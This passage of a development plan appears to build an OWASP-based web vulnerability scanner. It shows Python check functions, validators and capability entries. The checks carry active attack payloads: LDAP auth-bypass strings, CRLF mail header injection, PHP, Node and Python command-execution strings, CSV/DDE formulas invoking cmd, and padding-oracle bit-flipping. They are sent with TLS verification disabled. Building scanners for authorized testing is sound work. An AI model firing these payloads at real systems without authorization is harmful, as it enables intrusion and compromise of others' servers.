    invalid_times = _measure(invalid_username)

    if len(valid_times) < 5 or len(invalid_times) < 5:
        return result

    mean_valid = statistics.mean(valid_times)
    mean_invalid = statistics.mean(invalid_times)
    delta = abs(mean_valid - mean_invalid)

    if delta > 100:  # >100ms statistical difference
        result.passive_finding = True
        result.active_confirmed = True
        result.confidence = min(0.90, 0.50 + delta / 1000)
        result.evidence = (
            f"Timing delta {delta:.0f}ms between valid ({mean_valid:.0f}ms) "
            f"and invalid ({mean_invalid:.0f}ms) usernames — account enumeration possible"
        )
        result.details = {"mean_valid_ms": mean_valid, "mean_invalid_ms": mean_invalid, "delta_ms": delta}
    return result
```

- [ ] **Step 10: Add LDAP injection check**

```python
# ── WSTG-INPV-06: LDAP Injection ─────────────────────────────────────────────

_LDAP_PAYLOADS = [
    "*)(uid=*))(|(uid=*",
    "admin)(&(password=*))",
    "*)(|(password=*)",
    "*()|%26'",
]

def check_ldap_injection(url: str, param: str, method: str = "POST") -> GapCheckResult:
    """
    Active: inject LDAP special chars and compare response to baseline.
    Detects LDAP-backend auth bypass by response differential.
    """
    result = GapCheckResult(check_id="WSTG-INPV-06", vuln_name="LDAP Injection")
    ctx = ssl.create_default_context()
    ctx.check_hostname = False
    ctx.verify_mode = ssl.CERT_NONE

    def _send(payload: str) -> Optional[dict]:
        try:
            if method.upper() == "GET":
                parsed = urllib.parse.urlparse(url)
                qs = urllib.parse.parse_qs(parsed.query)
                qs[param] = [payload]
                new_url = urllib.parse.urlunparse(parsed._replace(
                    query=urllib.parse.urlencode(qs, doseq=True)))
                req = urllib.request.Request(new_url)
            else:
                data = urllib.parse.urlencode({param: payload}).encode()
                req = urllib.request.Request(url, data=data, method="POST")
                req.add_header("Content-Type", "application/x-www-form-urlencoded")
            req.add_header("User-Agent", "Mozilla/5.0")
            with urllib.request.urlopen(req, timeout=8, context=ctx) as resp:
                body = resp.read(4096).decode("utf-8", errors="replace")
                return {"status": resp.status, "body": body}
        except urllib.error.HTTPError as e:
            return {"status": e.code, "body": ""}
        except Exception:
            return None

    # Baseline with benign input
    baseline = _send("normaluser")
    if not baseline:
        return result

    for payload in _LDAP_PAYLOADS:
        probe = _send(payload)
        if not probe:
            continue
        # Auth bypass: login page returns 200 or redirect to dashboard
        if (probe["status"] in (200, 302) and
                baseline["status"] not in (200, 302)):
            result.passive_finding = True
            result.active_confirmed = True
            result.confidence = 0.85
            result.evidence = (
                f"LDAP injection: payload {payload!r} returned HTTP {probe['status']} "
                f"vs baseline HTTP {baseline['status']}"
            )
            return result
        # Response contains LDAP error
        if re.search(r"ldap|invalid dn|ldap_bind|javax\.naming", probe["body"], re.I):
            result.passive_finding = True
            result.confidence = 0.65
            result.evidence = f"LDAP error disclosure with payload {payload!r}"
            return result

    return result
```

- [ ] **Step 11: Add remaining checks (mail header, code injection, CSV, postMessage, web storage, RNG, weak crypto, padding oracle, service worker, WebRTC, gRPC/SOAP, SAML, password policy)**

```python
# ── WSTG-INPV-10: Mail Header Injection ──────────────────────────────────────

def check_mail_header_injection(url: str, param: str) -> GapCheckResult:
    """Active: inject CRLF into email form param, check for no rejection."""
    result = GapCheckResult(check_id="WSTG-INPV-10", vuln_name="Mail Header Injection")
    payload = "test@test.com\r\nBcc: canary@oneinfinity.test\r\n"
    ctx = ssl.create_default_context()
    ctx.check_hostname = False
    ctx.verify_mode = ssl.CERT_NONE
    try:
        data = urllib.parse.urlencode({param: payload}).encode()
        req = urllib.request.Request(url, data=data, method="POST")
        req.add_header("Content-Type", "application/x-www-form-urlencoded")
        req.add_header("User-Agent", "Mozilla/5.0")
        with urllib.request.urlopen(req, timeout=8, context=ctx) as resp:
            body = resp.read(2048).decode("utf-8", errors="replace")
            if resp.status in (200, 302) and not re.search(r"invalid|error|rejected", body, re.I):
                result.passive_finding = True
                result.active_confirmed = True
                result.confidence = 0.72
                result.evidence = (
                    f"Mail form accepted CRLF-injected payload without error (HTTP {resp.status})"
                )
    except urllib.error.HTTPError as e:
        if e.code in (400, 422):
            pass  # Properly rejected
    except Exception as e:
        log.debug("mail_header_injection check failed: %s", e)
    return result


# ── WSTG-INPV-11: Code Injection ─────────────────────────────────────────────

_CODE_INJECTION_PAYLOADS = [
    ("php_system",  "<?php echo shell_exec('id'); ?>"),
    ("php_eval",    "<?php eval('echo 1+1;'); ?>"),
    ("node_exec",   "require('child_process').execSync('id').toString()"),
    ("python_exec", "__import__('os').popen('id').read()"),
]
_CODE_INJECTION_EVIDENCE = re.compile(r"uid=\d+\(\w+\)\s+gid=\d+", re.I)

def check_code_injection(url: str, param: str, method: str = "GET") -> GapCheckResult:
    result = GapCheckResult(check_id="WSTG-INPV-11", vuln_name="Code Injection")
    ctx = ssl.create_default_context()
    ctx.check_hostname = False
    ctx.verify_mode = ssl.CERT_NONE
    for name, payload in _CODE_INJECTION_PAYLOADS:
        try:
            if method.upper() == "GET":
                parsed = urllib.parse.urlparse(url)
                qs = urllib.parse.parse_qs(parsed.query)
                qs[param] = [payload]
                probe_url = urllib.parse.urlunparse(parsed._replace(
                    query=urllib.parse.urlencode(qs, doseq=True)))
                req = urllib.request.Request(probe_url)
            else:
                data = urllib.parse.urlencode({param: payload}).encode()
                req = urllib.request.Request(url, data=data, method="POST")
                req.add_header("Content-Type", "application/x-www-form-urlencoded")
            req.add_header("User-Agent", "Mozilla/5.0")
            with urllib.request.urlopen(req, timeout=8, context=ctx) as resp:
                body = resp.read(4096).decode("utf-8", errors="replace")
                if _CODE_INJECTION_EVIDENCE.search(body):
                    result.passive_finding = True
                    result.active_confirmed = True
                    result.confidence = 0.97
                    result.evidence = f"Code injection ({name}): `id` output found in response"
                    return result
        except Exception as e:
            log.debug("code_injection %s failed: %s", name, e)
    return result


# ── CSV Injection ─────────────────────────────────────────────────────────────

_CSV_INJECT_PAYLOADS = ['=HYPERLINK("http://canary.oneinfinity.test","x")',
                         "=cmd|'/C calc'!A0", "@SUM(1+1)*cmd|'/C calc'!A0"]

def check_csv_injection(url: str, param: str) -> GapCheckResult:
    result = GapCheckResult(check_id="WSTG-INPV-CSV", vuln_name="CSV Injection")
    ctx = ssl.create_default_context()
    ctx.check_hostname = False
    ctx.verify_mode = ssl.CERT_NONE
    for payload in _CSV_INJECT_PAYLOADS:
        try:
            data = urllib.parse.urlencode({param: payload}).encode()
            req = urllib.request.Request(url, data=data, method="POST")
            req.add_header("Content-Type", "application/x-www-form-urlencoded")
            req.add_header("User-Agent", "Mozilla/5.0")
            with urllib.request.urlopen(req, timeout=8, context=ctx) as resp:
                body = resp.read(4096).decode("utf-8", errors="replace")
                ct = dict(resp.headers).get("Content-Type", "")
                if "csv" in ct.lower() or "spreadsheet" in ct.lower():
                    if payload[:10] in body:
                        result.passive_finding = True
                        result.active_confirmed = True
                        result.confidence = 0.88
                        result.evidence = f"CSV export contains unescaped formula: {payload[:40]!r}"
                        return result
        except Exception as e:
            log.debug("csv_injection check failed: %s", e)
    return result


# ── WSTG-CLNT-11: postMessage Hijacking ──────────────────────────────────────

_POSTMESSAGE_PATTERNS = [
    re.compile(r'window\.addEventListener\s*\(\s*["\']message["\']', re.I),
    re.compile(r'\.postMessage\s*\(', re.I),
    re.compile(r'event\.data', re.I),
]
_ORIGIN_CHECK_PATTERNS = [
    re.compile(r'event\.origin\s*[!=]=', re.I),
    re.compile(r'event\.origin\s*\.startsWith', re.I),
]

def check_postmessage_hijacking(url: str, js_body: str) -> GapCheckResult:
    result = GapCheckResult(check_id="WSTG-CLNT-11", vuln_name="postMessage Hijacking Risk")
    uses_pm = any(p.search(js_body) for p in _POSTMESSAGE_PATTERNS)
    if not uses_pm:
        return result
    has_origin_check = any(p.search(js_body) for p in _ORIGIN_CHECK_PATTERNS)
    if not has_origin_check:
        result.passive_finding = True
        result.confidence = 0.68
        result.evidence = (
            "postMessage listener found without event.origin validation — "
            "cross-origin messages accepted without verification"
        )
    return result


# ── WSTG-CLNT-12: Web Storage Security ───────────────────────────────────────

_SENSITIVE_STORAGE_KEYS = re.compile(
    r'(auth|token|jwt|session|password|secret|key|api_?key|access|credential)',
    re.I
)
_STORAGE_SET_PATTERN = re.compile(r'localStorage\.setItem\s*\(\s*["\']([^"\']+)["\']', re.I)

def check_web_storage(url: str, js_body: str) -> GapCheckResult:
    result = GapCheckResult(check_id="WSTG-CLNT-12", vuln_name="Sensitive Data in Web Storage")
    for m in _STORAGE_SET_PATTERN.finditer(js_body):
        key = m.group(1)
        if _SENSITIVE_STORAGE_KEYS.search(key):
            result.passive_finding = True
            result.confidence = 0.72
            result.evidence = f"Sensitive key '{key}' stored in localStorage — accessible to any same-origin JS (XSS impact)"
            return result
    return result


# ── Insecure RNG Detection ────────────────────────────────────────────────────

def check_insecure_rng(url: str, token_samples: List[str]) -> GapCheckResult:
    """
    Passive: chi-squared entropy test on sampled tokens.
    Sequential tokens (session_0001, session_0002) flag immediately.
    """
    result = GapCheckResult(check_id="WSTG-CRYP-RNG", vuln_name="Insecure Random Number Generation")
    if len(token_samples) < 5:
        return result

    # Sequential pattern check
    for i in range(len(token_samples) - 1):
        t1, t2 = token_samples[i], token_samples[i+1]
        # Strip common prefix and check if suffix is numeric sequential
        common_len = 0
        for a, b in zip(t1, t2):
            if a == b:
                common_len += 1
            else:
                break
        suffix1 = t1[common_len:]
        suffix2 = t2[common_len:]
        if suffix1.isdigit() and suffix2.isdigit():
            if int(suffix2) - int(suffix1) <= 2:
                result.passive_finding = True
                result.confidence = 0.90
                result.evidence = f"Sequential token pattern detected: {t1!r} → {t2!r}"
                return result

    # Entropy check — concatenate all tokens and measure byte distribution
    combined = "".join(token_samples)
    if len(combined) < 20:
        return result
    byte_counts = [combined.count(chr(i)) for i in range(256) if chr(i) in combined]
    if not byte_counts:
        return result
    total = sum(byte_counts)
    entropy = -sum((c/total) * math.log2(c/total) for c in byte_counts if c > 0)
    # Good random tokens: entropy > 3.5 bits per char
    if entropy < 2.5:
        result.passive_finding = True
        result.confidence = 0.75
        result.evidence = f"Low token entropy: {entropy:.2f} bits/char (expected >3.5 for secure RNG)"
        result.details["entropy_bits"] = entropy
    return result


# ── WSTG-CRYP-04: Weak Encryption Pattern Detection ──────────────────────────

_WEAK_CRYPTO_PATTERNS = [
    (re.compile(r'\bMD5\s*\(', re.I), "MD5 hash usage"),
    (re.compile(r'\bSHA1\s*\(|\bSHA-1\b', re.I), "SHA1 hash usage"),
    (re.compile(r'\bDES\b|\b3DES\b|\bTripleDES\b', re.I), "DES/3DES cipher usage"),
    (re.compile(r'["\']AES.ECB["\']|mode\s*[=:]\s*["\']ECB["\']', re.I), "AES-ECB mode usage"),
    (re.compile(r'base64\.(encode|decode)\s*\(.*password', re.I), "Base64 used as encryption"),
    (re.compile(r'rot13|caesar.cipher|vigenere', re.I), "Trivially weak cipher"),
]

def check_weak_encryption_patterns(url: str, body: str) -> GapCheckResult:
    result = GapCheckResult(check_id="WSTG-CRYP-04", vuln_name="Weak Encryption Algorithm")
    for pattern, description in _WEAK_CRYPTO_PATTERNS:
        m = pattern.search(body)
        if m:
            result.passive_finding = True
            result.confidence = 0.70
            result.evidence = f"{description} detected at offset {m.start()}: {m.group(0)!r}"
            return result
    return result


# ── WSTG-CRYP-02: Padding Oracle ─────────────────────────────────────────────

def check_padding_oracle(url: str, cookie_name: str, cookie_value: str) -> GapCheckResult:
    """
    Active: flip one bit in the ciphertext and measure response difference.
    If the error response differs between padding error and decryption error, padding oracle exists.
    """
    result = GapCheckResult(check_id="WSTG-CRYP-02", vuln_name="Padding Oracle")
    if not cookie_value:
        return result
    ctx = ssl.create_default_context()
    ctx.check_hostname = False
    ctx.verify_mode = ssl.CERT_NONE

    def _send_cookie(value: str) -> Optional[dict]:
        try:
            req = urllib.request.Request(url)
            req.add_header("Cookie", f"{cookie_name}={value}")
            req.add_header("User-Agent", "Mozilla/5.0")
            with urllib.request.urlopen(req, timeout=8, context=ctx) as resp:
                body = resp.read(2048).decode("utf-8", errors="replace")
                return {"status": resp.status, "len": len(body), "body": body[:200]}
        except urllib.error.HTTPError as e:
            return {"status": e.code, "len": 0, "body": ""}
        except Exception:
            return None

    baseline = _send_cookie(cookie_value)
    if not baseline:
        return result

    # Flip last byte of cookie value (base64 or hex)
    try:
        import base64
        decoded = base64.b64decode(cookie_value + "==")
        flipped = bytearray(decoded)
        flipped[-1] ^= 0x01
        modified_value = base64.b64encode(bytes(flipped)).decode()
    except Exception:
        modified_value = cookie_value[:-1] + ("A" if cookie_value[-1] != "A" else "B")

    probe = _send_cookie(modified_value)
    if not probe:
        return result

    # Padding oracle: different error types = different response sizes/codes
    if (probe["status"] != baseline["status"] and
            probe["status"] in (400, 500) and
            baseline["status"] == 200):
        result.passive_finding = True
        result.active_confirmed = True
        result.confidence = 0.75
        result.evidence = (
            f"Padding oracle candidate: bit-flip on cookie '{cookie_name}' changed "
            f"response from HTTP {baseline['status']} to {probe['status']}"
        )
    return result


# ── Service Worker Abuse ──────────────────────────────────────────────────────

_SW_REGISTER = re.compile(r'navigator\.serviceWorker\.register\s*\(\s*["\']([^"\']+)["\']', re.I)
_SENSITIVE_PATHS = re.compile(r'/api/|/auth|/login|/account|/payment|/checkout', re.I)

def check_service_worker(url: str, js_body: str) -> GapCheckResult:
    result = GapCheckResult(check_id="WSTG-CLNT-SW", vuln_name="Service Worker Abuse Risk")
    m = _SW_REGISTER.search(js_body)
    if not m:
        return result
    sw_path = m.group(1)
    # Check scope: if SW registered at root (/), it covers all paths including sensitive ones
    if sw_path.endswith("/sw.js") or sw_path in ("/service-worker.js", "/sw.js"):
        result.passive_finding = True
        result.confidence = 0.60
        result.evidence = (
            f"Service worker registered at root scope ({sw_path}) — "
            "may intercept sensitive API requests if compromised via XSS"
        )
    return result


# ── WebRTC IP Leakage ─────────────────────────────────────────────────────────

_WEBRTC_PATTERNS = re.compile(
    r'RTCPeerConnection|webkitRTCPeerConnection|mozRTCPeerConnection', re.I
)

def check_webrtc_leak(url: str, js_body: str) -> GapCheckResult:
    result = GapCheckResult(check_id="WSTG-CLNT-WEBRTC", vuln_name="WebRTC IP Leakage")
    if _WEBRTC_PATTERNS.search(js_body):
        result.passive_finding = True
        result.confidence = 0.55
        result.evidence = (
            "WebRTC API usage detected — may leak real client IP through STUN/TURN, "
            "bypassing proxy/VPN. Requires browser-based confirmation."
        )
        result.needs_validation = True
    return result


# ── gRPC / SOAP Endpoint Detection ───────────────────────────────────────────

def check_grpc_soap(base_url: str, response_headers: Dict[str, str],
                    response_body: str) -> GapCheckResult:
    result = GapCheckResult(check_id="WSTG-API-GRPC", vuln_name="gRPC/SOAP Endpoint Exposed")
    ct = response_headers.get("Content-Type", response_headers.get("content-type", ""))
    if "application/grpc" in ct.lower():
        result.passive_finding = True
        result.confidence = 0.70
        result.evidence = "gRPC endpoint detected via Content-Type: application/grpc"
    elif "wsdl" in response_body.lower() or "<definitions" in response_body:
        result.passive_finding = True
        result.confidence = 0.75
        result.evidence = "SOAP WSDL endpoint detected — enumerate operations and test for injection"
    # Also probe common WSDL paths
    elif "?wsdl" in base_url.lower() or base_url.endswith(".wsdl"):
        result.passive_finding = True
        result.confidence = 0.65
        result.evidence = f"WSDL URL pattern detected: {base_url}"
    return result


# ── WSTG-ATHN-10: SAML Assertion Validation ──────────────────────────────────

_SAML_PATTERNS = [
    re.compile(r'<saml:|<samlp:|SAMLResponse|SAMLRequest', re.I),
    re.compile(r'AssertionConsumerService|SingleSignOnService', re.I),
]
_SAML_UNSIGNED = re.compile(r'<Signature', re.I)

def check_saml_assertion(url: str, response_body: str) -> GapCheckResult:
    result = GapCheckResult(check_id="WSTG-ATHN-10", vuln_name="SAML Assertion Vulnerability")
    is_saml = any(p.search(response_body) for p in _SAML_PATTERNS)
    if not is_saml:
        return result
    has_signature = _SAML_UNSIGNED.search(response_body)
    if not has_signature:
        result.passive_finding = True
        result.confidence = 0.75
        result.evidence = (
            "SAML response detected without XML signature — "
            "assertion may be forgeable (unsigned SAML)"
        )
    return result


# ── WSTG-ATHN-07: Password Policy Testing ────────────────────────────────────

_WEAK_PASSWORDS = ["a", "aa", "password", "12345", "abc", "1", "pass"]

def check_password_policy(register_url: str, username_param: str = "username",
                           password_param: str = "password") -> GapCheckResult:
    result = GapCheckResult(check_id="WSTG-ATHN-07", vuln_name="Weak Password Policy")
    ctx = ssl.create_default_context()
    ctx.check_hostname = False
    ctx.verify_mode = ssl.CERT_NONE
    import random, string
    test_username = "oi_pwtest_" + "".join(random.choices(string.ascii_lowercase, k=6))
    for weak_pass in _WEAK_PASSWORDS:
        try:
            data = urllib.parse.urlencode({
                username_param: test_username, password_param: weak_pass
            }).encode()
            req = urllib.request.Request(register_url, data=data, method="POST")
            req.add_header("Content-Type", "application/x-www-form-urlencoded")
            req.add_header("User-Agent", "Mozilla/5.0")
            with urllib.request.urlopen(req, timeout=8, context=ctx) as resp:
                body = resp.read(2048).decode("utf-8", errors="replace")
                if resp.status in (200, 201, 302):
                    if not re.search(r"password.*too short|weak|minimum|must be", body, re.I):
                        result.passive_finding = True
                        result.active_confirmed = True
                        result.confidence = 0.85
                        result.evidence = f"Weak password accepted: {weak_pass!r} (HTTP {resp.status})"
                        return result
        except urllib.error.HTTPError:
            pass
        except Exception as e:
            log.debug("password_policy check failed: %s", e)
    return result
```

- [ ] **Step 12: Run tests**

```bash
python -m pytest tests/test_owasp_gap_checks.py -v
```
Expected: All tests pass.

- [ ] **Step 13: Commit**

```bash
git add modules/owasp_gap_checks.py tests/test_owasp_gap_checks.py
git commit -m "feat(gap-checks): add modules/owasp_gap_checks.py with 23 OWASP WSTG v4.2 gap check functions + GapCheckResult dataclass"
```

---

## Task 5: Extend `finding_validation_engine.py`

**Files:**
- Modify: `finding_validation_engine.py` (add 9 validate_* methods + update _dispatch)

- [ ] **Step 1: Add CSRF, cookie attrs, LDAP, weak TLS, account enum, session fixation, CSV, padding oracle validators**

Add these methods to the `FindingValidationEngine` class, directly after `_validate_passthrough`:

```python
    def validate_csrf(self, result: ValidationResult, finding: dict,
                      url: str, payload: str, param: str, method: str) -> bool:
        """Re-validate CSRF: replay POST without token, expect non-403."""
        from modules.owasp_gap_checks import check_csrf
        r = check_csrf(url, finding.get("response_body", ""),
                       finding.get("response_headers", {}), method)
        if r.active_confirmed:
            result.evidence = r.evidence
            result.evidence_type = "csrf_active"
            result.confidence = r.confidence
            result.flags.append("csrf_active_confirmed")
            self._build_poc(result, url, param, "POST without CSRF token", method)
            return True
        return False

    def validate_cookie_attrs(self, result: ValidationResult, finding: dict,
                               url: str, payload: str, param: str, method: str) -> bool:
        from modules.owasp_gap_checks import check_cookie_attributes
        headers = finding.get("response_headers", {})
        r = check_cookie_attributes(url, headers)
        if r.passive_finding and r.confidence >= 0.7:
            result.evidence = r.evidence
            result.evidence_type = "cookie_attribute"
            result.confidence = r.confidence
            result.flags.append("insecure_cookie")
            return r.active_confirmed  # only True if HTTP transmission confirmed

    def validate_session_fixation(self, result: ValidationResult, finding: dict,
                                   url: str, payload: str, param: str, method: str) -> bool:
        pre = finding.get("pre_login_session_id", "")
        post = finding.get("post_login_session_id", "")
        from modules.owasp_gap_checks import check_session_fixation
        r = check_session_fixation(pre, post, url)
        if r.active_confirmed:
            result.evidence = r.evidence
            result.evidence_type = "session_fixation"
            result.confidence = r.confidence
            result.flags.append("session_fixation")
            return True
        return False

    def validate_ldap_injection(self, result: ValidationResult, finding: dict,
                                 url: str, payload: str, param: str, method: str) -> bool:
        from modules.owasp_gap_checks import check_ldap_injection
        r = check_ldap_injection(url, param, method)
        if r.active_confirmed:
            result.evidence = r.evidence
            result.evidence_type = "ldap_injection"
            result.confidence = r.confidence
            result.flags.append("ldap_injection_confirmed")
            self._build_poc(result, url, param, payload, method)
            return True
        return False

    def validate_weak_tls(self, result: ValidationResult, finding: dict,
                           url: str, payload: str, param: str, method: str) -> bool:
        import urllib.parse as _up, socket as _sock
        parsed = _up.urlparse(url)
        host = parsed.hostname or url
        port = parsed.port or 443
        from modules.owasp_gap_checks import check_weak_tls
        r = check_weak_tls(host, port)
        if r.active_confirmed:
            result.evidence = r.evidence
            result.evidence_type = "weak_tls"
            result.confidence = r.confidence
            result.flags.append("weak_tls_accepted")
            return True
        return False

    def validate_ssrf_oob(self, result: ValidationResult, finding: dict,
                           url: str, payload: str, param: str, method: str) -> bool:
        """SSRF: only confirm if OOB callback flag is explicitly set."""
        oob_received = finding.get("oob_callback_received", False)
        if oob_received:
            result.evidence = finding.get("evidence", "SSRF confirmed via OOB callback")
            result.evidence_type = "oob_callback"
            result.confidence = 0.95
            result.flags.append("ssrf_oob_confirmed")
            self._build_poc(result, url, param, payload, method)
            return True
        # Downgrade without OOB
        result.confidence = 0.35
        result.flags.append("ssrf_unconfirmed_no_oob")
        return False

    def validate_padding_oracle(self, result: ValidationResult, finding: dict,
                                 url: str, payload: str, param: str, method: str) -> bool:
        cookie_name = finding.get("cookie_name", "")
        cookie_value = finding.get("cookie_value", "")
        from modules.owasp_gap_checks import check_padding_oracle
        r = check_padding_oracle(url, cookie_name, cookie_value)
        if r.active_confirmed:
            result.evidence = r.evidence
            result.evidence_type = "padding_oracle"
            result.confidence = r.confidence
            result.flags.append("padding_oracle_confirmed")
            return True
        return False

    def validate_account_enumeration(self, result: ValidationResult, finding: dict,
                                      url: str, payload: str, param: str, method: str) -> bool:
        valid_user = finding.get("valid_username", "admin")
        invalid_user = finding.get("invalid_username", "nonexistent_oi_test_user_xyz")
        from modules.owasp_gap_checks import check_account_enumeration_timing
        r = check_account_enumeration_timing(url, valid_user, invalid_user)
        if r.active_confirmed:
            result.evidence = r.evidence
            result.evidence_type = "timing_enumeration"
            result.confidence = r.confidence
            result.flags.append("account_enumeration_timing")
            return True
        return False
```

- [ ] **Step 2: Update `_dispatch` in `FindingValidationEngine`**

Add new entries to the dispatch dict (in the `_dispatch` method):
```python
            "csrf": self.validate_csrf,
            "missing_csrf": self.validate_csrf,
            "cookie_attributes": self.validate_cookie_attrs,
            "insecure_cookie": self.validate_cookie_attrs,
            "session_fixation": self.validate_session_fixation,
            "ldap_injection": self.validate_ldap_injection,
            "weak_tls": self.validate_weak_tls,
            "ssrf_oob": self.validate_ssrf_oob,
            "padding_oracle": self.validate_padding_oracle,
            "account_enumeration": self.validate_account_enumeration,
```

- [ ] **Step 3: Run tests**

```bash
python -m pytest tests/ -v -k "validation"
```
Expected: All pass, no errors from the new dispatch entries.

- [ ] **Step 4: Commit**

```bash
git add finding_validation_engine.py
git commit -m "feat(validation): add 9 validate_* methods for OWASP gap checks — CSRF, cookie attrs, session fixation, LDAP, weak TLS, SSRF OOB, padding oracle, account enumeration"
```

---

## Task 6: Extend `modules/capability_map.py`

**Files:**
- Modify: `modules/capability_map.py` (Vuln class + CAPABILITIES dict)

- [ ] **Step 1: Add new Vuln constants**

At the end of the `Vuln` class (after `SOURCE_MAP_EXPOSURE = ...`), add:

```python
    # OWASP WSTG v4.2 gap checks
    WEAK_TLS            = "Weak TLS Configuration"
    TLS_CERT_ISSUE      = "TLS Certificate Issue"
    BACKUP_FILES        = "Backup/Archive File Exposed"
    COOKIE_ATTRS        = "Insecure Cookie Attributes"
    CSRF                = "Cross-Site Request Forgery (CSRF)"
    SESSION_FIXATION    = "Session Fixation"
    SESSION_TIMEOUT     = "Missing Session Timeout"
    ACCOUNT_ENUM        = "Account Enumeration via Timing"
    WEAK_PASSWORD_POLICY= "Weak Password Policy"
    SAML_VULN           = "SAML Assertion Vulnerability"
    LDAP_INJECTION      = "LDAP Injection"
    MAIL_HEADER_INJ     = "Mail Header Injection"
    CODE_INJECTION      = "Code Injection"
    CSV_INJECTION       = "CSV Injection"
    POSTMESSAGE_HIJACK  = "postMessage Hijacking Risk"
    WEB_STORAGE         = "Sensitive Data in Web Storage"
    INSECURE_RNG        = "Insecure Random Number Generation"
    WEAK_CRYPTO         = "Weak Encryption Algorithm"
    PADDING_ORACLE      = "Padding Oracle"
    SERVICE_WORKER      = "Service Worker Abuse Risk"
    WEBRTC_LEAK         = "WebRTC IP Leakage"
    GRPC_SOAP_EXPOSED   = "gRPC/SOAP Endpoint Exposed"
    CODE_INJECTION_EVAL = "Code Injection via eval"
```

- [ ] **Step 2: Add new ToolCapability entries**

Add these entries to the `CAPABILITIES` dict (at the end of the dict, before the closing `}`):

```python
    "owasp_gap_weak_tls": ToolCapability(
        name="owasp_gap_weak_tls",
        category="crypto",
        description="Detects deprecated TLS versions (1.0/1.1) and weak cipher suites.",
        detects=[Vuln.WEAK_TLS, Vuln.TLS_CERT_ISSUE],
        inputs=[InputSpec("host", "host", True, "Target hostname")],
        outputs=[OutputField("findings", "list[dict]", "TLS weakness findings")],
        requires_phase=["deep_recon"],
        feeds_into=["exploit_chains"],
        confidence={Vuln.WEAK_TLS: "high", Vuln.TLS_CERT_ISSUE: "high"},
        typical_duration_sec=10, rate_sensitive=False, noise_level="low", passive=False,
        notes="Uses stdlib ssl module — no external tools required.",
    ),
    "owasp_gap_backup_files": ToolCapability(
        name="owasp_gap_backup_files",
        category="config",
        description="Probes for backup/archive files (.bak, .old, .zip, .sql, etc.) in webroot.",
        detects=[Vuln.BACKUP_FILES, Vuln.INFO_LEAK],
        inputs=[InputSpec("base_url", "url", True), InputSpec("paths", "list[str]", False)],
        outputs=[OutputField("findings", "list[dict]")],
        requires_phase=["deep_recon"],
        feeds_into=["exploit_chains"],
        confidence={Vuln.BACKUP_FILES: "high"},
        typical_duration_sec=30, rate_sensitive=True, noise_level="medium",
        notes="Caps at 20 paths × 13 extensions = 260 requests max.",
    ),
    "owasp_gap_csrf": ToolCapability(
        name="owasp_gap_csrf",
        category="session",
        description="Detects missing CSRF token protection on state-changing endpoints.",
        detects=[Vuln.CSRF],
        inputs=[InputSpec("url", "url", True), InputSpec("body", "str", True)],
        outputs=[OutputField("findings", "list[dict]")],
        requires_phase=["auth_session"],
        feeds_into=["exploit_chains"],
        confidence={Vuln.CSRF: "high"},
        typical_duration_sec=10, rate_sensitive=False, noise_level="low",
    ),
    "owasp_gap_cookie_attrs": ToolCapability(
        name="owasp_gap_cookie_attrs",
        category="session",
        description="Checks Set-Cookie headers for missing HttpOnly, Secure, SameSite flags.",
        detects=[Vuln.COOKIE_ATTRS],
        inputs=[InputSpec("url", "url", True), InputSpec("headers", "dict", True)],
        outputs=[OutputField("findings", "list[dict]")],
        requires_phase=["auth_session"],
        feeds_into=[],
        confidence={Vuln.COOKIE_ATTRS: "high"},
        typical_duration_sec=5, rate_sensitive=False, noise_level="low", passive=True,
    ),
    "owasp_gap_session_fixation": ToolCapability(
        name="owasp_gap_session_fixation",
        category="session",
        description="Compares session IDs before and after login to detect fixation.",
        detects=[Vuln.SESSION_FIXATION],
        inputs=[InputSpec("url", "url", True)],
        outputs=[OutputField("findings", "list[dict]")],
        requires_phase=["auth_session"],
        feeds_into=[],
        confidence={Vuln.SESSION_FIXATION: "high"},
        typical_duration_sec=15, rate_sensitive=False, noise_level="low",
    ),
    "owasp_gap_account_enum": ToolCapability(
        name="owasp_gap_account_enum",
        category="auth",
        description="Statistical timing comparison between valid and invalid usernames at login.",
        detects=[Vuln.ACCOUNT_ENUM],
        inputs=[InputSpec("login_url", "url", True)],
        outputs=[OutputField("findings", "list[dict]")],
        requires_phase=["auth_session"],
        feeds_into=[],
        confidence={Vuln.ACCOUNT_ENUM: "medium"},
        typical_duration_sec=30, rate_sensitive=True, noise_level="medium",
        notes="Sends 20 login requests (10 valid, 10 invalid). May trigger lockout on aggressive targets.",
    ),
    "owasp_gap_ldap_injection": ToolCapability(
        name="owasp_gap_ldap_injection",
        category="injection",
        description="Detects LDAP injection via response differential on LDAP-backed auth endpoints.",
        detects=[Vuln.LDAP_INJECTION],
        inputs=[InputSpec("url", "url", True), InputSpec("param", "str", True)],
        outputs=[OutputField("findings", "list[dict]")],
        requires_phase=["active_testing"],
        feeds_into=["exploit_chains"],
        confidence={Vuln.LDAP_INJECTION: "high"},
        typical_duration_sec=20, rate_sensitive=False, noise_level="medium",
    ),
    "owasp_gap_mail_header_inj": ToolCapability(
        name="owasp_gap_mail_header_inj",
        category="injection",
        description="Detects mail header injection via CRLF in email form parameters.",
        detects=[Vuln.MAIL_HEADER_INJ],
        inputs=[InputSpec("url", "url", True), InputSpec("param", "str", True)],
        outputs=[OutputField("findings", "list[dict]")],
        requires_phase=["active_testing"],
        feeds_into=[],
        confidence={Vuln.MAIL_HEADER_INJ: "medium"},
        typical_duration_sec=10, rate_sensitive=False, noise_level="low",
    ),
    "owasp_gap_code_injection": ToolCapability(
        name="owasp_gap_code_injection",
        category="injection",
        description="Detects server-side code injection (PHP eval, Node exec, Python exec).",
        detects=[Vuln.CODE_INJECTION],
        inputs=[InputSpec("url", "url", True), InputSpec("param", "str", True)],
        outputs=[OutputField("findings", "list[dict]")],
        requires_phase=["active_testing"],
        feeds_into=["exploit_chains"],
        confidence={Vuln.CODE_INJECTION: "high"},
        typical_duration_sec=20, rate_sensitive=False, noise_level="high",
    ),
    "owasp_gap_csv_injection": ToolCapability(
        name="owasp_gap_csv_injection",
        category="injection",
        description="Detects CSV formula injection in data export endpoints.",
        detects=[Vuln.CSV_INJECTION],
        inputs=[InputSpec("url", "url", True), InputSpec("param", "str", True)],
        outputs=[OutputField("findings", "list[dict]")],
        requires_phase=["active_testing"],
        feeds_into=[],
        confidence={Vuln.CSV_INJECTION: "medium"},
        typical_duration_sec=10, rate_sensitive=False, noise_level="low",
    ),
    "owasp_gap_web_storage": ToolCapability(
        name="owasp_gap_web_storage",
        category="client_side",
        description="Detects sensitive data (tokens, passwords) stored in localStorage/sessionStorage.",
        detects=[Vuln.WEB_STORAGE],
        inputs=[InputSpec("url", "url", True), InputSpec("js_body", "str", True)],
